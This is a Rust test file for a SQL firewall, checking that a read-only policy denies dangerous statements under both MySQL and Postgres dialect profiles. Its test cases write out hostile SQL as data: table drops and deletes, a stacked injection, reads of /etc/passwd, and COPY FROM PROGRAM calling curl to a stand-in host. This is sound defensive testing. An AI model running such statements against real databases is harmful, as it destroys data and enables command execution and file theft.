//! One firewall, two dialects. Proves the PolicyProfile split did not fork
//! the firewall: core dangerous statements must Deny identically under the
//! MySQL and Postgres profiles, and each dialect's own escape hatches Deny
//! under that dialect. No live database.

use mw_core::config::Policy;
use mw_core::policy::{evaluate, Decision, MYSQL_PROFILE, PG_PROFILE};

fn is_deny(d: Decision) -> bool {
    matches!(d, Decision::Deny(_))
}

#[test]
fn core_dangerous_statements_deny_under_both_dialects() {
    let cases = [
        "DROP TABLE t",
        "DELETE FROM t",
        "UPDATE t SET x = 1",
        "TRUNCATE TABLE t",
        "SELECT 1; DELETE FROM t",
        "/* c */ DROP TABLE t",
        "SELECT load_file('/etc/passwd')",
        "GRANT ALL ON x TO y",
    ];
    for sql in cases {
        assert!(
            is_deny(evaluate(sql, &Policy::ReadOnly, &MYSQL_PROFILE)),
            "mysql should deny: {sql:?}"
        );
        assert!(
            is_deny(evaluate(sql, &Policy::ReadOnly, &PG_PROFILE)),
            "postgres should deny: {sql:?}"
        );
    }
}

#[test]
fn plain_select_allowed_under_both_dialects() {
    for sql in ["SELECT 1", "SELECT id, name FROM accounts WHERE id = 1"] {
        assert_eq!(
            evaluate(sql, &Policy::ReadOnly, &MYSQL_PROFILE),
            Decision::Allow
        );
        assert_eq!(
            evaluate(sql, &Policy::ReadOnly, &PG_PROFILE),
            Decision::Allow
        );
    }
}

#[test]
fn postgres_specific_escape_hatches_denied() {
    for sql in [
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT pg_ls_dir('/')",
        "SELECT dblink('x', 'select 1')",
        "COPY t TO PROGRAM 'sh -c id'",
        "COPY t FROM PROGRAM 'curl evil'",
    ] {
        assert!(
            is_deny(evaluate(sql, &Policy::ReadOnly, &PG_PROFILE)),
            "postgres should deny: {sql:?}"
        );
    }
}

#[test]
fn mysql_specific_escape_hatches_denied() {
    for sql in [
        "SELECT * FROM t INTO OUTFILE '/tmp/x'",
        "SELECT sys_exec('id')",
        "SET GLOBAL max_connections = 1",
    ] {
        assert!(
            is_deny(evaluate(sql, &Policy::ReadOnly, &MYSQL_PROFILE)),
            "mysql should deny: {sql:?}"
        );
    }
}
